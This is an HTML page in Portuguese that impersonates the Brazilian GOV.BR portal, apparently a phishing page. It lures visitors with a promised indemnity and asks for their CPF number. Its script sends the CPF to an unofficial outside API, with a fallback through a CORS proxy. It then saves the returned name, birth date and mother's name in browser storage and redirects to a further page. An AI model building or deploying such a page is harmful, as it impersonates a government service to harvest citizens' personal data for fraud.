<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type" />
  <title>Consulta - Verificação - 1</title>
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" blocking="render"></script>

  <!-- FONTES -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: "Poppins", sans-serif;
    }

    @keyframes pulse-scale {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
    }

    .animate-pulse-scale {
      animation: pulse-scale 1s ease-in-out infinite;
    }

    .loader {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #2563eb;
      border-radius: 50%;
      width: 18px;
      height: 18px;
      animation: spin 0.8s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-right: 6px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body class="w-full overflow-x-hidden bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">

  <!-- HEADER -->
  <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
    <div class="px-4 py-2 flex justify-between items-center">
      <div class="flex items-center space-x-3">
        <img alt="Logo GOV.BR" class="h-6 w-auto" src="imagens/Gov-br-logo-svg.png">
        <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
        <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
      </div>
      <div class="flex items-center space-x-3">
        <div class="flex items-center space-x-1 text-xs text-gray-500">
          <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
          </svg>
          <span class="hidden sm:inline">Seguro</span>
        </div>
        <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/>
          </svg>
          <span class="font-medium" id="nameHeader"></span>
        </button>
      </div>
    </div>
  </header>

  <!-- BARRA DE CAMINHO -->
  <div >
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-sm">
      <span>Benefício</span>
      <span class="mx-2">&gt;</span>
      <span>Indenização</span>
      <span class="mx-2">&gt;</span>
      <span>Usuário GOV.BR</span>
    </div>
  </div>

  <!-- HERO -->
  <div class="relative bg-gray-600 py-8">
    <div class="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-80" style="background-image: url(imagens/gov-br-hero-mobile.webp);"></div>
    <div class="absolute bg-black opacity-70 inset-0"></div>
    <div class="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
      <h1 class="text-3xl md:text-4xl font-bold text-white mb-4">Portal GOV.BR</h1>
      <p class="text-lg text-white opacity-90">Acesso rápido e seguro aos seus benefícios</p>
    </div>
  </div>

  <div class="h-8"></div>

  <!-- FORMULÁRIO -->
  <div class="max-w-md mx-auto px-4">
    <div class="bg-white rounded-lg shadow-lg p-8">
      <div class="text-center mb-8">
        <h2 class="text-2xl font-bold text-blue-900 mb-2">Verifique sua Indenização</h2>
        <p class="text-gray-600">Informe seu CPF para consultar o valor disponível no GOV.BR</p>
      </div>

      <form class="space-y-6">
        <div>
          <label class="flex items-center text-sm font-medium text-gray-700 mb-2">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                 stroke-linecap="round" stroke-linejoin="round"
                 class="lucide lucide-user w-4 h-4 mr-2">
              <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/>
              <circle cx="12" cy="7" r="4"/>
            </svg>
            Número do CPF
          </label>
          <input id="cpf" placeholder="000.000.000-00"
                 class="w-full px-4 py-3 border border-gray-300 rounded-lg 
                        focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg"
                 type="text" value="">
        </div>

        <button type="submit"
                class="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400
                       text-white font-semibold py-4 px-6 rounded-lg transition-colors text-lg">
          CONSULTAR INDENIZAÇÃO
        </button>
      </form>
    </div>
  </div>

  <!-- SCRIPT PRINCIPAL (tudo aqui dentro) -->
  <script>
  // Funções auxiliares
  const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
  async function fetchJsonWithCorsFallback(url) {
    try {
      const r = await fetch(url, { headers: { 'Accept': 'application/json, text/plain, */*' } });
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const ct = r.headers.get('content-type') || '';
      return ct.includes('application/json') ? await r.json() : JSON.parse(await r.text());
    } catch (err) {
      console.warn('[CORS] tentando proxy:', err.message);
      const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
      const r2 = await fetch(proxyUrl);
      return await r2.json();
    }
  }

  function _buildRedirectWithParams(destHref) {
    const dest = new URL(destHref, window.location.href);
    const current = new URLSearchParams(window.location.search);
    const merged = new URLSearchParams(dest.search);
    current.forEach((v, k) => { if (!merged.has(k)) merged.set(k, v); });
    dest.search = merged.toString() ? '?' + merged.toString() : '';
    return dest.pathname + dest.search + dest.hash;
  }

  // Lógica principal
  document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const cpfInput = document.getElementById('cpf');
    if (!form || !cpfInput) return;

    // Formata CPF
    cpfInput.addEventListener('input', function(e) {
      let v = e.target.value.replace(/\D/g, '');
      if (v.length > 11) v = v.slice(0, 11);
      if (v.length > 9) v = v.replace(/^(\d{3})(\d{3})(\d{3})(\d{0,2}).*/, '$1.$2.$3-$4');
      else if (v.length > 6) v = v.replace(/^(\d{3})(\d{3})(\d{0,3}).*/, '$1.$2.$3');
      else if (v.length > 3) v = v.replace(/^(\d{3})(\d{0,3}).*/, '$1.$2');
      e.target.value = v;
    });

    // Submit handler
    form.addEventListener('submit', async function(e) {
      e.preventDefault();

      const cpf = cpfInput.value.replace(/\D/g, '');
      if (cpf.length !== 11) {
        alert('Por favor, digite um CPF válido.');
        return;
      }

      const btn = form.querySelector('button[type="submit"]');
      const original = btn.innerHTML;
      btn.innerHTML = '<div class="loader"></div>Consultando...';
      btn.disabled = true;

      try {
        const url = `https://apionlineconsulta.vercel.app/api/proxy?cpf=${encodeURIComponent(cpf)}`;
        const data = await fetchJsonWithCorsFallback(url);

        if (!data || !data.dadosBasicos) {
          alert('CPF não encontrado na base de dados.');
          console.error('[CPF] JSON inesperado:', data);
          return;
        }

        localStorage.setItem('dadosBasicos', JSON.stringify(data));
        localStorage.setItem('cpf', String(data.dadosBasicos.cpf || cpf).replace(/\D/g, ''));
        localStorage.setItem('name', data.dadosBasicos.nome || '');
        localStorage.setItem('nasc', data.dadosBasicos.nascimento || '');
        localStorage.setItem('name_m', data.dadosBasicos.mae || '');

        const finalUrl = _buildRedirectWithParams('video.php');
        window.location.href = finalUrl;

      } catch (err) {
        alert('Erro ao consultar o CPF. Veja o console.');
        console.error(err);
      } finally {
        btn.innerHTML = original;
        btn.disabled = false;
      }
    });
  });
  </script>

</body>
</html>
